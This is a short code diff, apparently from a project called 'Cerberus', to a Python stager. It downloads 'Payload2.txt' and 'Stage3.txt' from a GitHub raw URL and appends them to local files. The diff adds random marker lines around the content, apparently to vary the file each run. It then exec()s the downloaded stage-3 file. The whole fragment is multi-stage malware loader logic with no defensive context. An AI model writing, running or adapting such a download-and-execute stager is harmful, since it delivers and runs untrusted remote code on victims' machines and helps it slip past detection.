@@ -7,10 +7,14 @@ if os.path.isfile(path) == False:
     file = open('Stage3Host.py', 'a')
     file.close()
 
-with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Payload2.txt") as response:
-    data = response.read().decode("utf-8")
-    with open(filename, "a+") as fp: fp.write(data)
+with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Payload2.txt") as retrieve:
+    data = retrieve.read().decode("utf-8")
+    with open(filename, "a+") as file: 
+        file.write("rem" + rN + "\n" + data)
 
-urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage3.txt", path)
+with urllib.request.urlopen("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage3.txt") as retrieve:
+    data = retrieve.read().decode("utf-8")
+    with open(path, "a+") as file:
+        file.write("#" + rN + "\n" + str(data) + "\n" + "#" + rN)
 
 exec(open(path).read()) # Runs stage 3 file
